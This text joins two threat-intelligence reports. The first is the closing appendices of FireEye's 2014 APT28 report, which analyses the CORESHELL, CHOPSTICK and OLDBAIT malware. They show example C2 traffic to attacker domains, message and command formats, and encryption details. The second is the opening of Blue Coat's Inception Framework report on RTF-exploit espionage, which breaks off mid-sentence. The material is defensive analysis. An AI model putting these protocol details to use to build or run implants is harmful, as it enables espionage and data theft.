summarize our key observations about APT28 in                 by the Russian government .
Figure 11 below .
Figure 11 : Summary of key observations about APT28
MALWARE
Evolves and Maintains Tools for Continued , Long - Term Use
• 	  Uses malware with flexible and lasting platforms
• 	  Constantly evolves malware samples for continued use
• 	  Malware is tailored to specific victims’ environments , and is designed to hamper reverse engineering efforts
• 	  Development in a formal code development environment
Various Data Theft Techniques
• 	  Backdoors using HTTP protocol
• 	  Backdoors using victim mail server
• 	  Local copying to defeat closed / air gapped networks
TARGETING
Georgia and the Caucasus
• 	  Ministry of Internal Affairs
• 	  Ministry of Defense
• 	  Journalist writing on Caucasus issues
• 	  Kavkaz Center
Eastern European Governments & Militaries
• 	  Polish Government
• 	  Hungarian Government
• 	  Ministry of Foreign Affairs in Eastern Europe
• 	  Baltic Host exercises
Security - related Organizations
• 	  NATO
• 	  OSCE
• 	  Defense attaches
• 	  Defense events and exhibitions
RUSSIAN ATTRIBUTES
Russian Language Indicators
• 	  Consistent use of Russian language in malware over a period of six years
• 	  Lure to journalist writing on Caucasus issues suggests APT28 understands both Russian and English
Malware Compile Times Correspond to Work Day in Moscow ’s Time Zone
• 	  Consistent among APT28 samples with compile times from 2007 to 2014
• 	  The compile times align with the standard workday in the UTC + 4 time zone which includes major Russian cities such
as Moscow and St. Petersburg
28 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APPENDIX A :
DISTINGUISHING
THREAT GROUPS
We use the term “ threat group ” to refer to actors        Threat actors leave behind various forensic
who work together to target and penetrate                details . They may send spear phishing emails from
networks of interest . These individuals may share        a specific IP address or email address . Their emails
the same set of tasks , coordinate targets , and           may contain certain patterns ; files have specific
share tools and methodology . They work together          names , MD5 hashes , timestamps , custom
to gain access to their targets and steal data .          functions , and encryption algorithms . Their
backdoors may have command and control IP
The art of attributing disparate intrusion activities    addresses or domain names embedded . These are
to the same threat group is not always simple .           just a few examples of the myriad of forensic
Different groups may use similar intrusion               details that we consider when distinguishing one
methodologies and common tools , particularly             threat group from another .
those that are widely available on the Internet ,
such as pwdump , HTran , or Gh0st RAT . There may           At the most basic level , we say that two intrusion
be overlaps between groups caused by the sharing         events are attributed to the same group when we
of malware or exploits they have authored , or            have collected enough indicators to show beyond
even the sharing of personnel . Individual threat         a reasonable doubt that the same actor or group
actors may move between groups either                    of actors were involved . We track all of the
temporarily or permanently . A threat actor may           indicators and significant linkages associated with
also be a private citizen who is hired by multiple       identified threat groups in a proprietary database
groups . Multiple groups , on occasion , compromise         that comprises millions of nodes and linkages
the same target within the same timeframe .               between them . In this way , we can always go back
and answer “ why ” we associated cyber threat
Distinguishing one threat group from another is          activity with a particular group .
possible with enough information , analytical
experience , and tools to piece it all together . We
can analyze multiple incidents and tell by the
evidence left behind that a given incident was the
result of one threat group and not another .
29 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APPENDIX B :
TIMELINE OF
APT28 LURES
YEAR LURE TOPIC                                                                                             MALWARE
2010       Iran ’s work with an international organization ( internal document )                                SOURFACE
SOURFACE ,
2011       File named “ military cooperation.doc ”
OLDBAIT
2011       Georgian language IT document for Ministry of Internal Affairs ( internal document )                SOURFACE
“ USB Disk Security is the best software to block threats that can damage your PC or compromise
2011                                                                                                        SOURFACE
your personal information via USB storage . ”
2012       Food security in Africa ( “ Food and nutrition crisis reaches peak but good forecast for 2013 ” )     SOURFACE
2012       “ IDF Soldier Killed and another injured in a Terror Attack ”                                       SOURFACE
2012       “ Echo Crisis Report ” on Portugal ’s forest fires                                                   SOURFACE
2012       “ FBI to monitor Facebook , Twitter , Myspace ”                                                       SOURFACE
2012       Georgia ( US state , not the country of Georgia ) murder case uncovers terror plot                   SOURFACE
2012       Military attaches in London ( internal document )                                                   SOURFACE
CHOPSTICK ,
2013       South Africa MFA document
CORESHELL
2013       John Shalikashvili ( Georgian - Polish - American US General ) Questionnaire                            CORESHELL
2013       Asia Pacific Economic Cooperation Summit 2013 reporters ( internal document )                       SOURFACE
CHOPSTICK ,
2013       Defense Attaches in Turkey ( internal document )
CORESHELL
CHOPSTICK ,
2013       Turkish Cypriot news about Syria chemical weapons
CORESHELL
2013       Georgian language document about drivers’ licenses ( internal document )                            EVILTOSS
2013       Apparent Reason Magazine - related lure sent to a journalist                                        CORESHELL
2014       Mandarin language document , possibly related to a Chinese aviation group ( non - public document )    CORESHELL
2014       Netherlands - Malaysia cessation of hostilities ; related to Ukraine airline attack                  CORESHELL
30 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APPENDIX C :
SOURFACE / CORESHELL
SOURFACE is a downloader that obtains a second         two payloads . Messages are sent using HTTP
stage backdoor from a C2 server . Over time the         POST requests whose bodies contain encrypted
downloader has evolved and the newer versions ,         and Base64 encoded data . The encryption
usually compiled with the DLL name ‘ coreshell.dll’ ,    algorithm is a custom stream cipher using a
are distinct enough from the older versions that       six - byte key . Commands from the controller to the
we refer to it as SOURFACE / CORESHELL or                CORESHELL implant are encrypted using another
simply CORESHELL . This appendix focuses on             stream cipher but this time using an eight - byte
these newer versions .                                  key . CORESHELL has used the same user agent
string ( “ MSIE 8.0 ” ) that SOURFACE previously
CORESHELL uses two threads to communicate              used , but in more recent samples CORESHELL
with its C2 server . The first thread sends beacons     uses the default Internet Explorer user agent
that contain the process listing of the                string obtained from the system . Figure 11 shows
compromised host . The second thread is                 an example POST request .
responsible for downloading and executing stage
Figure 11 : Example CORESHELL POST request
POST /check/ HTTP/1.1
User - Agent : MSIE 8.0
Host : adawareblock.com
Content - Length : 58
Cache - Control : no - cache
zXeuYq+sq2m1a5HcqyC5Zd6yrC2WNYL989WCHse9qO6c7powrOUh5KY=
31 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
When Base64 decoded , the POST content looks like this :
00000000 cd 77 ae 62 af ac ab 69 b5 6b 91 dc ab 20 b9 65 .w.b ... i.k ... .e
00000010 de b2 ac 2d 96 35 82 fd f3 d5 82 1e c7 bd a8 ee ... -.5 ..........
00000020 9c ee 9a 30 ac e5 21 e4 a6 ... 0 .. ! ..
The key used to encrypt the message is six bytes long and is appended to the end of the message . In this is
example the key would be : 30 ac e5 21 e4 a6 . When the message is decrypted , the resulting plaintext is :
00000000 00 72 68 64 6e 7a 78 64 66 6d 46 36 66 35 61 68 .rhdnzxdfmF6f5ah
00000010 34 78 67 30 34 30 33 30 35 30 31 1a 00 00 00 23 4xg04030501 .... #
00000020 00 00 00 ...
The following table contains a breakdown of each of the field ’s C2 message .
Table 6 : Example CORESHELL beacon structure
Offset 	       Value                     Description
00            00                        Command byte :
0 - Command request
1 - Process listing
01            “ rhdn ”                    Unknown - Potentially a campaign identifier . Values seen so far : “ rhze ” , “ rhdn ” and “ mtfs ” .
05            “ zxdfmF6f5ah4xg ”          Hostname of compromised system
13            “ 0403 ”                    Unknown - Potentially a version number . This number is hardcoded within the implant .
17            “ 05 ”                      OS Major version
19            “ 01 ”                      OS Minor version
1B            0x0000001a                Header length minus the command byte ( LE DWORD )
1F            0x00000023                Length of the entire message ( LE DWORD )
32 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Commands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST
requests . The command is identified by the NULL terminated UNICODE string “ OK ” ( O\x00\K\x00\x00\
x00 ) . The command is Base64 encoded and immediately follows the “ OK ” string . Figure 12 shows a
sample CORESHELL command :
Figure 12 : Example CORESHELL controller response
HTTP/1.1 200 OK
Content - Type : text / html ; charset = utf-8
Content - Length : 58
O.K ... AQAAAKqqAQEBAQEBAQEVzPMEUUIzQtND8kOSRLVEVUV0RRRGN0bX
The Base64 decoded string is :
00000000 01 00 00 00 AA AA 01 01 01 01 01 01 01 01 10 41 ........ ....... A
00000010 70 41 10 42 33 42 D3 43 F2 43 92 44 B5 44 55 45 pA.B3B.C .C.D.DUE
00000020 74 45 14 46 37 46 D7 tE.F7F.
The following table contains a description of each field in the command message :
Table 7 : CORESHELL C2 message structure
Offset 	       Value                         Description
00            0x00000001                    Constant value , must be set to 1 ( LE DWORD )
04            AA AA                         Unknown - not referenced
06            01 01 01 01 01 01 01 01       Encryption key ( 8 bytes )
0E            10 41 70 41 10 42 33 ...       Encrypted command
33 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
When the above command “ 10 41 70 41 10 42 33 … ” is decrypted using the key “ 01 01 01 01 01
01 01 01 ” the following command message is produced :
00000000 04 CC C2 04 00 42 42 42 42 43 43 43 43 44 44 44 ..... BBBBCCCCDDD
00000010 44 45 45 45 45 46 46 46 46                       DEEEEFFFF
The implant supports the following four command identifiers from the controller as seen in Table 8 . The
first byte of the command message specifies the command type and is immediately followed by the PE or
shellcode to be executed . In this example the command byte is 04 indicating the following bytes are
shellcode . If the command byte was 01 , 02 , or 03 the following bytes would be a DLL or EXE that would
be written to disk and executed .
Table 8 : CORESHELL commands
Command ID            Description
01                    Save command data as % LOCALAPPDATA%\svchost.exe and execute using CreateProcess .
02                    Save command data as % LOCALAPPDATA%\conhost.dll and execute using “ rundll32.exe \”%s\”,#1 ” .
03                    Save command data as % LOCALAPPDATA%\conhost.dll and execute using LoadLibrary .
04                    Command data is a shell code and is executed using CreateThread .
34 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APPENDIX D :
CHOPSTICK
CHOPSTICK is a backdoor that uses a modularized , object - oriented framework written in C++ . This
framework allows for a diverse set of capabilities across malware variants sharing a common code base .
CHOPSTICK may communicate with external servers using SMTP or HTTP . This appendix documents
variants using HTTP communications .
The first time CHOPSTICK is executed , it may encrypt and store configuration data in the Registry key
HKU\S-1 - 5 - 19_Classes\Software\Microsoft\MediaPlayer\{E6696105-E63E-4EF1 - 939E-
15DDD83B669A}\chnnl . The user HKU\S-1 - 5 - 19 corresponds to the LOCAL_SERVICE account SID .
The configuration block is encrypted using RC4 encryption . The key is a combination of a 50-byte static
key and a four - byte salt value randomly generated at runtime . The static key is derived from opcodes in
the backdoor .
CHOPSTICK collects detailed information from the host including the Windows version , CPU
architecture , Windows Firewall state , User Account Control ( UAC ) configuration settings on Windows
Vista and above and Internet Explorer settings . It also tests for the installation of specific security
products ( Table 9 ) and applications ( Table 10 ) .
Table 9 : Endpoint security products detected by CHOPSTICK
Service Name 	                                         Security Product
Acssrv                                                Agnitum Client Security
AVP                                                   Kaspersky
SepMasterService                                      Symantec
McAfeeService                                         McAfee
AntiVirService                                        Avira
Ekrn                                                  ESET
DrWebAVService                                        Dr. Web Enterprise Security
MBAMService                                           Malwarebytes Anti - Malware
35 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Table 10 : Applications detected by CHOPSTICK
Process Name 	                                                Application
firefox.exe                                                  Mozilla Firefox
iexplore.exe                                                 Internet Explorer
outlook.exe                                                  Microsoft Outlook
opera.exe                                                    Opera Browser
bat.exe                                                      Unknown
msimn.exe                                                    Outlook Express
vpngui.exe                                                   Cisco Anyconnect VPN client
ipseca.exe                                                   IPsec VPN client
ipsecc.exe                                                   IPsec VPN client
openvpn.exe                                                  OpenVPN client
openssl.exe                                                  OpenSSL
openvpn-gui-1.0.3.exe                                        OpenVPN client
msmsgs.exe                                                   Microsoft Messenger
wuauclt.exe                                                  Windows Update
chrome.exe                                                   Google Chrome Browser
thebat.exe                                                   The Bat Secure Email Client
skype.exe                                                    Skype Messenger
36 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
After collecting host information , CHOPSTICK creates a hidden file that may be named
% ALLUSERSPROFILE%\edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the
name “ check_mes_v5555”.28 Its usage of a Windows mailslot would potentially allow external binaries to
write data to the “ check_mes_v5555 ” mailslot , possibly allowing CHOPSTICK to encrypt and store
output from other malware . It creates a thread that records user activity on the host , capturing desktop
screenshots in JPEG format , tracks current window focus , collects keystrokes , and scrapes window
contents ( text , context menus , etc . ) . User activity is captured once every 500 milliseconds and logged in
an HTML - like format . The thread writes user activity log messages to the “ check_mes_v5555 ” mailslot in
plain text . CHOPSTICK reads messages from the mailslot , encrypts them using RC4 , and then stores the
encrypted message in an edg6EF885E2.tmp temporary file . The RC4 encryption used here also uses a 50-
byte static key plus four - byte random salt value .
After approximately 60 seconds of execution time , CHOPSTICK begins communicating with one of its C2
servers over HTTP . After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2 .
tmp to the C2 server using HTTP POST requests . It does not wait for a response from the server to begin
uploading . Once the contents of edg6EF885E2.tmp are uploaded , CHOPSTICK deletes the file . Figure 13
below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp .
Figure 13 : Sample CHOPSTICK v2 HTTP POST
POST /search/?btnG = D-3U5vY&utm=79iNI&ai = NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt = n-
B9onK2KCi HTTP/1.1
Accept : text / html , application / xhtml+xml , application / xml;q=0.9,*;q=0.8
Accept - Language : en - us , en;q=0.5
Accept - Encoding : gzip , deflate
User - Agent : Mozilla/5.0 ( Windows NT 6 . ; WOW64 ; rv:20.0 ) Gecko/20100101
Firefox/20.0
Host : windows-updater.com
Content - Length : 77
Cache - Control : no - cache
1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==
28
A mailslot is a Windows inter - process communication ( IPC ) mechanism similar to a named pipe , but is designed for one - way communications between
processes and can also be used across the network .
37 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
CHOPSTICK uses a URL - safe Base64 encoding , using an alphabet that substitutes “ + ” and “ / ” for “ - ” and
“ _ ” , respectively . Each HTTP request contains multiple Base64 encoded URL parameters , however only
one parameter contains information encoded by the malware ( “ ai= ” ) and the rest of the URL parameters
appear to be randomly generated per request .
CHOPSTICK encrypts an 11-byte sequence in the “ ai= ” parameter . The purpose of this parameter
appears to be to uniquely identify the particular instance of the backdoor to the C2 server . The Base64
encoded text of this parameter begins with a number of randomly generated alphabetical characters
presumably intended to prevent people from Base64 decoding the whole string without some knowledge
of how the malware family works . The first four bytes of the message are an XOR key for the remainder of
the data . Once decrypted using the XOR key , an 11-byte sequence is revealed . The first seven bytes are
static , and are hard - coded in CHOPSTICK , while the last four bytes appear to be unique .
The message body of the POST request is also Base64 encoded . This encoded string is also prefixed with
random characters designed to break the output of a Base64 decode operation on the entire string . The
first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence
stored in the “ ai= ” parameter as described above . Decrypting these bytes yields another static seven - byte
sequence , followed by four unique bytes . The remainder of the message body consists of the RC4
encrypted data containing the HTML - formatted user activity log , edg6EF885E2.tmp .
After uploading edg6EF885E2.tmp , CHOPSTICK continues to query its C2 servers for commands using
HTTP GET requests . The malware contains code which allows it to load or memory - map external modules
that export the following functions : SendRawPacket , GetRawPacket , InitializeExp , DestroyExp ,
IsActiveChannel , GetChannelInfo , SetChannelInfo , Run , GetModuleInfo , GiveMessage ,
and TakeMessage .
38 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Modularity
CHOPSTICK backdoors are compiled within a modularized development framework . This means that
two separate CHOPSTICK backdoors may contain vastly different functionality , depending on which
modules were included at compile time . The modules that are included in an instance of CHOPSTICK
may be reported to the C2 server as part of POST messages . Figure 14 includes an example from a
CHOPSTICK v1 variant :
Figure 14 : Sample CHOPSTICK v1 HTTP POST including module identification
POST /webhp?rel = psy&hl=7&ai = d2SSzFKlR4l0dRd_ZdyiwE17aTzOPeP - PVsYh1lVAXpLhIebB4=
HTTP/1.1
Accept : text / html , application / xhtml+xml , application / xml;q=0.9,*/*;q=0.8
Accept - Language : en - us , en;q=0.5
Accept - Encoding : gzip , deflate
User - Agent : Mozilla/5.0 ( Windows NT 6 . ; WOW64 ; rv:20.0 ) Gecko/20100101
Firefox/20.0
Host : adobeincorp.com
Content - Length : 71
Cache - Control : no - cache
d2SSzFKchH9IvjcM55eQCTbMbVAU7mR0IK6pNOrbFoF7Br0Pi__0u3Sf1Oh30_HufqHiDU=
39 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
To decode the POST content , the first step is to remove characters from the Base64 string ( the number of
characters to remove may vary between different communication channels ) . In the example from Figure
14 , the number of characters removed is seven . Once these characters are removed the decoded ( but
still encrypted ) text looks like this :
00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r .. ” .. 3.^@$.1.@S
00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........ lZ .... >/
00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 ..... S .. O ..... 5
The first two words ( “ 72 11 ” and “ fd 22 ” ) are checksums that are used to validate the message . The next 4
bytes “ f8 dc 33 9e ” are a salt value that is appended to the end of an RC4 key . Once decrypted , the
message looks like the following :
00000000 72 11 fd 22 f8 dc 33 9e 56 34 4d 47 4e 78 5a 57 r .. ” .. 3.V4MGNxZW
00000010 6c 76 63 6d 68 6a 4f 47 39 79 5a 51 3d 3c 3c ee lvcmhjOG9yZQ=<<.
00000020 01 00 00 01 00 23 01 10 23 01 11 23 01 13 23 ..... # .. # .. # .. #
The strings “ V4MGNxZWlvcmhjOG9yZQ ” and “ = < < \xee ” are hardcoded in the implant . The module
information starts at offset 0x20 with the string “ 01 00 00 ” and is formatted as follows :
Table 11 : Example CHOPSTICK v1 message format
Offset 	       Value                                    Description
00            0x0001                                   Message from the AgentKernel v1
02            00                                       Command ID
03            01 00 23 01 10 23 01 11 23 01 13 23      List of modules included in the implant
separated by a ‘ # ’ character
40 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
The modules included in this CHOPSTICK v1 implant are :
Table 12 : Example CHOPSTICK v1 module list
Module ID          Internal Module Name             Description
0x0001             AgentKernel                      Kernel , probably version 1 . Handles communication between modules and C2
tunnels .
0x1001             modKey                           Logs keystrokes and takes screen captures .
0x1101             modFS                            Facilitates file system access , such as directory browsing along with reading ,
deleting and opening files .
0x1301             modProcRet                       Remote command shell access .
Our determination of a CHOPSTICK “ v1 ” versus “ v2 ” is based on the self - identification of the kernel ID
and associated modules . Compare the list of CHOPSTICK v1 modules in Table 12 with the list of modules
in an example CHOPSTICK v2 variant in Table 13 :
Table 13 : Example CHOPSTICK v2 module list
Module ID          Internal Module Name             Description
0x0002             kernel                           Kernel , probably version 2 . Handles communication between modules and C2
tunnels .
0x1002                                             Logs keystrokes and takes screen captures .
0x1102                                             Facilitates filesystem access , such as directory browsing along with reading ,
deleting and opening files .
0x1302                                             Remote command shell access .
0x1602                                             Load additional DLLs .
41 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
The kernel IDs 0x0001 and 0x0002 indicate different versions . The corresponding modules in each
backdoor also are consistently identified with 0x01 and 0x02 , respectively , in the second byte . In both
variants the modules with keystroke log , file system access , and command shell capabilities have the
consistent identifiers 0x10 , 0x11 , and 0x13 , respectively , in the first byte . This suggests that the first byte
in the module ID identifies the module type whereas the second byte identifies the kernel version .
The kernel sends commands to each module using its module ID . The commands that each module
understands are likely consistent from build to build . Table 14 and Table 15 show examples of commands
that each module understands .
Table 14 : Commands understood by modFS ( 0x1101 ) module
Command ID 	              Description          Example
01                       Find file            \x01\x11\x01Directory&file&[01 ]
02                       Read file            \x01\x11\x02Directory&file&[01 ]
03                       Write file           \x01\x11\x03Directory&file&[Contents ]
04                       Delete file          \x01\x11\x04Directory&file&[01 ]
05                       Execute file         \x01\x11\x05Directory&file&[01 ]
Table 15 : Commands understood by modProcRet ( 0x1301 ) module
Command ID 	              Description          Example
00                       CMD.exe output       \x01\x13\x00[Output ]
01                       CMD.exe start        \x01\x13\x01
02                       CMD.exe exit         \x01\x13\x02
11                       CMD.exe input        \x01\x13\x11[Input ]
42 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APPENDIX E :
OLDBAIT
OLDBAIT is a credential harvester that installs itself in % ALLUSERPROFILE%\\Application Data\
Microsoft\MediaPlayer\updatewindws.exe . There is a missing space in the MediaPlayer directory and
the filename is missing the ‘ o’ character . Both the internal strings and logic are obfuscated and are
unpacked at startup . Credentials for the following applications are collected :
• 	      Internet Explorer
• 	      Mozilla Firefox
• 	      Eudora
• 	      The Bat ! ( an email client made by a Moldovan company )
• 	      Becky ! ( an email client made by a Japanese company )
Both email and HTTP can be used to send out the collected credentials . Sample HTTP traffic is
displayed in Figure 15 .
Figure 15 : Example OLDBAIT HTTP traffic
POST /index.php HTTP/1.0
Accept : text / html
Accept - Language : en - us
Content - Type : application / x - www - form - urlencoded
Content - Length : 6482
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 )
Host : windous.kz
Connection : Keep - Alive
Pragma : no - cache
prefs = C789Cu0Zacq7acr0D7LUawy6CY4REIaZBciWc6yVCN -- cut--
43 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Figure 16 : Example OLDBAIT SMTP traffic
From : lisa.cuddy@wind0ws.kz
To : dr.house@wind0ws.kz
Subject : photo(9a3d8ea4-test )
Date : Tue , 23 Sep 2014 15:42:56 -0500
MIME - Version : 1.0
Content - Type : text / plain ;
charset=”us - ascii ”
Content - Transfer - Encoding : 7bit
X - Priority : 3
X - MSMail - Priority : Normal
X - Mailer : Microsoft Outlook Express 6.00.2900.2670
X - MimeOLE : Produced By Microsoft MimeOLE v6.00.2900.2670
X - Spam : Not detected
= = = STARTPOINT===
qVV5KyHocV3FkUeENvu9LnVIlRB0YTa7xhoTwhRlIBBI7gRzVxikQXDRkdy4vGt1WfBtg9Utzbny
Uh+usXJHZ9Esecqq0UKg5Ul1O2E2OiyBTnGDPdP00UMRx / E+2it/10wQyH / epo8zuLnCuxPe7B+K
--cut---
hU+MWBLP+7h5ZojN
= = = ENDPOINT===
OLDBAIT handles APIs very similarly to SOURFACE and EVILTOSS . There is a setup routine that loads
the imports into a table and all API calls reference an index to this table . In SOURFACE and EVILTOSS the
table is stored in a global variable while in OLDBAIT this table is allocated at runtime and a pointer is
passed between functions .
44 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
FireEye , Inc. | 1440 McCarthy Blvd . Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( 347.3393 ) | info@fireeye.com | www.fireeye.com
© 2014 FireEye , Inc. All rights reserved . FireEye is a registered trademark of FireEye , Inc.
All other brands , products , or service names are or may be trademarks or service marks of
their respective owners . SP.APT28.EN - US.102014
45 fireeye.com

Whitepaper :
The Inception Framework :
Cloud - hosted APT
By Snorre Fagerland and Waylon Grange
Blue Coat Systems , Inc
1
Executive summary
Blue Coat researchers have uncovered a previously - undocumented , highly
automated , and extremely sophisticated framework for performing targeted
attacks . The framework is notable for a number of reasons , including ( but not
limited to ) its use of a cloud - based infrastructure for command - and - control and its
use of the WebDAV protocol to send instructions and receive exfiltrated
information from compromised systems .
Initial malware components were embedded in Rich Text Format ( RTF ) files .
Exploitation of vulnerabilities in this file format is leveraged to gain remote access
to victim ’s computers .
The framework , thus far , has been using the services of a cloud service provider
based in Sweden , CloudMe.com , for its main command - and - control
infrastructure . Malware payloads designed for a wide array of potential devices ,
including home routers and mobile devices running iOS , BlackBerryOS or
Android , were also recovered during the course of our research .
The framework is designed in such a way that all post - infection communication
( i.e. target surveying , configuration updates , malware updates , and data
exfiltration ) can be performed via the cloud service . The malware components of
this framework follow a plugin model , where new malware rely on other ,
previously delivered malware components to interact with the framework .
Initial attacks were largely focused on Russia and a few other Eastern European
countries . However , we have later seen that attackers are interested in targets all
over the globe .
The framework is itself target - agnostic , and seems highly automated .
The operational security exhibited by the attackers is very good - among the best
we have seen . Most interaction between attackers and their infrastructure is
performed via a convoluted network of router proxies and rented hosts .
Although the attackers have left a few clues , we have been unable to provide
attribution with any degree of accuracy .
2
Introduction
The use of software vulnerabilities in order to execute malicious software on
unsuspecting users’ computers is an important parameter to monitor . This
method of attack is not only known to have a considerable success rate , it is also
often deployed by resourceful attackers and , as such , marks a threat worth
paying attention to .
The use of exploits in document formats like PDF , DOC and RTF is in some
ways especially noteworthy . Documents are commonly exchanged via mail ,
which make them perfect for email - borne targeted attacks ; what is otherwise
known as spear phishing .
In March , 2014 , Microsoft published information about a new vulnerability in Rich
Text Format ( RTF ) . This vulnerability , named CVE-2014 - 1761 ( Microsoft Word
RTF Object Confusion ) , had already been used effectively by attackers at the
time of the announcement . Two previous vulnerabilities in the RTF file format ,
known as CVE-2010 - 3333 and CVE-2012 - 0158 , had become , by that time ,
mainstays of targeted attacks , so we tracked how attackers implemented this
new exploit with keen interest .
By late August , we identified a malware espionage operation that used both the
CVE-2014 - 1761 and CVE-2012 - 0158 vulnerabilities to trigger execution of the
malicious payload , and which leveraged a single cloud service as the backbone
of its entire visible infrastructure .
When we examined the suspicious documents , it was discovered that they were
somewhat anomalous compared to the run - of - the - mill material . They turned out
to belong to a highly advanced and professional targeted attack framework ,
which utilized a complex series of techniques to survey potential targets .
Due to the many levels of obfuscation and indirection , we named this the
Inception framework ; but there ends all similarity with the movie by the same
name . Leonardo DiCaprio is not associated with this investigation .
3
PART I :
CloudMe
4
Use of trojanized documents
We initially knew little about who the actual targets were ; apart from one . In that
particular case we had the actual phishing email , so we knew the apparent
recipient – the CEO of a large Russian bank . The email was apparently sent from
“ Mrs. World ” ; note the Mrs. , and not Miss - World .
The weaponized Microsoft Word document attached to the email message
( “ photo.doc ” ) contained two separate exploits : one targeting the vulnerability
detailed in CVE-2012 - 0158 ( MSCOMCTL ActiveX Buffer Overflow ) ; the other
targeting the aforementioned CVE-2014 - 1761 .
5
Above : “ Mrs. World ” . Text and picture apparently taken from the news site mk.ru
We soon discovered that our malware repository contained several other , similar
documents , but these had come from other sources which did not include the
email message , or any identifiable information about the targets . However , the
text of the documents covered a variety of topics mostly revolving around
Russian issues relating to a variety of business sectors . The following pages
highlight a representative selection of these documents .
6
An article cribbed verbatim from the
Novye Izvestiya news Web site
about the Russian financial situation
in light of the Ukrainian crisis .
An application form to participate in
a seminar supposedly organized by
Russia ’s Federal Service for
Defense Contracts ( “ Федеральная
служба по оборонному заказу ” )
scheduled for Sept 24/25 2014 .
An article , in English , about the
Ukraine situation taken from the
Financial Times ( UK ) newspaper .
An “ advertisement ” from a supplier
of diesel engines and related
mechanical services . The letter lists
the Russian navy and the Border
Guard department of the FSB
among their customers .
7
“ Organigrama Gobierno Rusia.doc ”
– a summary profile of several high-
level Russian government officials –
originally submitted to VirusTotal
from an IP address in Spain .
An advertisement of a used car for
sale that purportedly originated from
an employee at the German
Embassy in Moscow .
Invitation to Russian Art Week
8
Document metadata
All documents that we have found so far have been rather standard Word
documents , of the old 97 - 2003 compatible format based on OLE2 .
Such documents can , and typically do , contain quite a bit of metadata : The name
of the document creator ; the user who edited it most recently ; the name of the
company whose copy of Word was used to create the document , et al . Users can
optionally configure Word to remove this metadata when a document is saved ,
and that ’s exactly what the creator of these documents did , stripping out this
potential source of attribution data .
However , Word documents in this format contain additional information , if you
know where to look .
All Word documents of this format contain what ’s known as a File Information
Block ( FIB ) . The FIB contains information about the file ’s internal structure , and
also – to some extent – data on the program used to create the file . In the case
of the samples we analyzed , all of the documents were saved using the same
build of Microsoft Word from Office14 ( better known as Office 2010 ) .
In addition , documents can contain slack space in which old data remains . For
example , the decoy that came with the attack named “ Organigrama Gobierno
Rusia.doc ” contains Visual Basic leftovers indicating that it originally was created
on a computer that was configured to be used by a native Spanish speaker ,
apparently by an advisor at the Spanish Embassy in Moscow . This document
was presumably obtained by the attackers and repurposed for the attack .
9
Targeted verticals
Despite the limited information at our disposal about the targets of these attacks ,
their content reveals some context about who the possible targets may have
been .
First of all , we have the decoy documents which indicate an interest in :
-    Embassies
-    Politics
-    Finance
-    Military
-    Engineering
We also have a set of phishing mails , which were targeted at :
-    The finance sector in Russia
-    The oil and energy industry in Romania , Venezuela , and Mozambique
-    Embassies and diplomats from various countries
10
Shellcode
The shellcode used is a pretty standard variant previously used by a number of
campaigns typically operating out of China , but with some minor changes . The
malicious content is stored inside the document in encoded form , and the
shellcode decodes and writes this to disk .
Above : The decoding loop
Upon successful execution this code drops a Word document and a Visual Basic
script . The Word document is displayed to the user to avoid arousing any
suspicion while the script is executed in the background .
Unusual for many exploit campaigns , the names of the dropped files vary ; for
example HyHa9AJ.vbs , ew_Rg.vbs , 0_QHdN.vbs , etc . – clearly randomized in
order to avoid detection by name .
11
Visual Basic Script dropper
The VBScript dropper code is also a little unusual . It declares a Windows
Management Instrumentation ( WMI ) object in order to reach components like the
registry and file system . This seems adapted from Microsoft example code , like
the one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx
When the VBSript is run it drops two files to disk . One is a polymorphed dll file
and the other a binary data file with no obvious internal structure . This data file
turns out to be encrypted using AES-256 .
12
The files will be installed in several locations :
% WinDir% ,             ex . “ C:\Windows ” .
% APPDATA% ,            ex . “ C:\Users\USERNAME\AppData\Roaming ”
% ALLUSERSPROFILE% , ex . “ C:\ProgramData ”
% CommonProgramFiles% , ex . “ C:\Program Files\Common Files ”
% USERPROFILE% ,        ex . “ C:\Users\USERNAME ”
These locations will vary some between operating system versions .
The VBScript then sets a startup key in the
“ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ” registry path to
execute the DLLs at boot time .
Regardless of whether the registry launches the DLL or when another malware
executable starts the DLL directly , the DLL is launched using regsrv32.exe with
the /s ( silent ) option .
The names of these dropped files change from attack to attack . The one above
drops ctfmonrc.dll . Other names observed were :
ctfmonm.dll
ctfmonrn.dll
wmiprvse.dll
alg.dll
dwm.dll
The encrypted data files are named using random words apparently taken from a
